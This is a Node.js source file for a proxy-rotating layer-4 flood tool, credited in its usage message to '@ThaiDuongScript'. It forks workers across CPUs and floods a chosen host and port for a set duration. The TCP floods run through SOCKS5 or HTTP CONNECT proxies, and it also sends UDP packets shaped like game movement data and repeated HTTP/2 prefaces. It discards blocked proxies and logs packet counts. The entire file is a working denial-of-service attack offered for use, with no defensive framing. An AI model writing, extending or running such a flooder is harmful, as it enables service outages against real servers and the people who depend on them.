const net = require('net');
const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');
const crypto = require('crypto');
const { SocksClient } = require('socks');
const { HttpsProxyAgent } = require('https-proxy-agent');
const colors = require('colors');
const varint = require('varint');
const [,, targetHost, targetPortStr, durationStr, threadsStr, mode, proxyFile, proxyType = 'socks5'] = process.argv;




const targetPort = parseInt(targetPortStr);
const duration = parseInt(durationStr);
const threads = parseInt(threadsStr) || os.cpus().length;
const attackMode = (mode || 'both').toLowerCase();
const proxyProtocol = proxyType.toLowerCase();
function createMovementPacket(playerId, x, y, z, yaw, action, speed) {
  const buf = Buffer.alloc(1 + 4 + 4 * 3 + 2 + 1 + 1);
  let offset = 0;

  buf.writeUInt8(0x01, offset); 
  offset += 1;

  buf.writeUInt32BE(playerId, offset); 
  offset += 4;

  buf.writeFloatBE(x, offset); 
  offset += 4;
  buf.writeFloatBE(y, offset); 
  offset += 4;
  buf.writeFloatBE(z, offset); 
  offset += 4;

  buf.writeInt16BE(yaw, offset);
  offset += 2;

  buf.writeUInt8(action, offset); 
  offset += 1;

  buf.writeUInt8(speed, offset); 
  
  return buf;
}

const packet = createMovementPacket(1234, 500.5, 0.0, 100.5, 90, 0x01, 0x00); 


if (
    !targetHost ||
    !targetPort ||
    !duration ||
    !threads ||
    !['tcp', 'udp', 'both'].includes(attackMode) ||
    !['socks5', 'http', 'http2'].includes(proxyProtocol)
) {
    console.log('Made by @ThaiDuongScript');
    console.error('Usage: node layer4_burst_mode.js <host> <port> <duration_sec> <threads> <mode: tcp|udp|both> <proxy_file> <proxy_type: socks5|http|http2>');
    process.exit(1);
}

let proxies = [];
if (proxyFile) {
    try {
        const data = fs.readFileSync(proxyFile, 'utf8');
        proxies = data.split('\n').filter(line => line.trim() !== '').map(line => {
            const [ip, port] = line.split(':');
            return { ip: ip.trim(), port: parseInt(port) };
        });
        console.log(`[Master] Loaded ${proxies.length} proxies from ${proxyFile}`);
    } catch (e) {
        console.error(`[Master] Error reading proxy file: ${e.message}`);
        process.exit(1);
    }
}

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)',
    'Mozilla/5.0 (Linux; Android 11)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64)',
    'Mozilla/5.0 (Linux; Android 10; K)',
    'Mozilla/5.0 (iPad; CPU OS 13_2 like Mac OS X)',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (PlayStation 4 3.11) AppleWebKit/537.73'
];
function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function randomPayload(length = 64) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let data = '';
    for (let i = 0; i < length; i++) {
        data += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return Buffer.from(data);
}

function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

function floodLoop() {
    const udpSocket = dgram.createSocket('udp4');
    let packetsSent = 0;

    setInterval(async () => {
        if (attackMode === 'tcp' || attackMode === 'both') {
            const proxy = getRandomProxy();
            if (!proxy) return;

            try {
                const userAgent = getRandomUserAgent();

                if (proxyProtocol === 'socks5') {
                    const info = await SocksClient.createConnection({
                        proxy: {
                            host: proxy.ip,
                            port: proxy.port,
                            type: 5
                        },
                        command: 'connect',
                        destination: {
                            host: targetHost,
                            port: targetPort
                        },
                        timeout: 5000
                    });

                    const tcp = info.socket;
                    tcp.setNoDelay(true);

                    for (let i = 0; i < threads; i++) {
                        const payload = crypto.randomBytes(64).toString('hex');
                        tcp.write(payload);
                        packetsSent++;
                    }

                    setTimeout(() => tcp.destroy(), 100);

                } else if (proxyProtocol === 'http') {
                    const socket = net.connect({
                        host: proxy.ip,
                        port: proxy.port,
                        timeout: 5000
                    }, () => {
                        const connectReq = `CONNECT ${targetHost}:${targetPort} HTTP/1.1\r\nHost: ${targetHost}:${targetPort}\r\n\r\n`;
                        socket.write(connectReq);
                    });

                    socket.once('data', (res) => {
                        if (res.toString().includes('200')) {
                            for (let i = 0; i < threads; i++) {
                                const payload = crypto.randomBytes(64).toString('hex');
                                
                                socket.write(payload);
                                packetsSent++;
                            }
                            setTimeout(() => socket.destroy(), 100);
} else if (res.toString().includes('403')) {
const index = proxies.findIndex(p => p.ip === proxy.ip && p.port === proxy.port);
    if (index !== -1) proxies.splice(index, 1);
                        } else {
                            socket.destroy();
                        }
                    });

                    socket.on('error', () => socket.destroy());

                } else if (proxyProtocol === 'http2') {
                    const info = await SocksClient.createConnection({
                        proxy: {
                            host: proxy.ip,
                            port: proxy.port,
                            type: 5
                        },
                        command: 'connect',
                        destination: {
                            host: targetHost,
                            port: targetPort
                        },
                        timeout: 5000
                    });

                    const socket = info.socket;
                    socket.setNoDelay(true);

                    const preface = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';
                    const settingsFrame = Buffer.from([
                        0x00, 0x00, 0x00,
                        0x04, 0x00,
                        0x00, 0x00, 0x00, 0x00
                    ]);

                    socket.write(preface);
                    socket.write(settingsFrame);

                    for (let i = 0; i < threads; i++) {
                        socket.write(preface);
                        packetsSent++;
                    }

                    setTimeout(() => socket.destroy(), 1000);
                }

            } catch (err) {
                // Silent

//const index = proxies.findIndex(p => p.ip === proxy.ip && p.port === proxy.port);
  //  if (index !== -1) proxies.splice(index, 1);
            }
        }

        if (attackMode === 'udp' || attackMode === 'both') {
            for (let i = 0; i < threads; i++) {
                const msg = `${packet}, 0, ${packet.length}, 3000`;
                udpSocket.send(msg, 0, msg.length, targetPort, targetHost, (err) => {
                    if (err) {
                        console.error(`[${'Worker ' + cluster.worker.id}]`.green.bold + ` UDP error: ${err.message}`);
                    }
                    packetsSent++;
                });
            }
        }

        console.log(`[LAYER4]`.yellow.italic.underline.bold + `
${'[WORKER]: ' + cluster.worker.id}`.cyan.bold + `
[Packet]: ${packetsSent}`.red.bold + `
[Remaining proxies]: ${proxies.length}`.magenta.bold + `
[Payload]: ${crypto.randomBytes(64).toString('hex')}`.green.bold);
    }, 1);
}

if (cluster.isPrimary) {
    console.log(`[Master] Starting ${attackMode.toUpperCase()} flood to ${targetHost}:${targetPort} for ${duration}s using ${threads} threads with ${proxyProtocol.toUpperCase()} proxy`);
    for (let i = 0; i < threads; i++) cluster.fork();
    setTimeout(() => {
        console.log('[Master] Attack finished.');
        process.exit(0);
    }, duration * 1000);
} else {
    floodLoop();
}
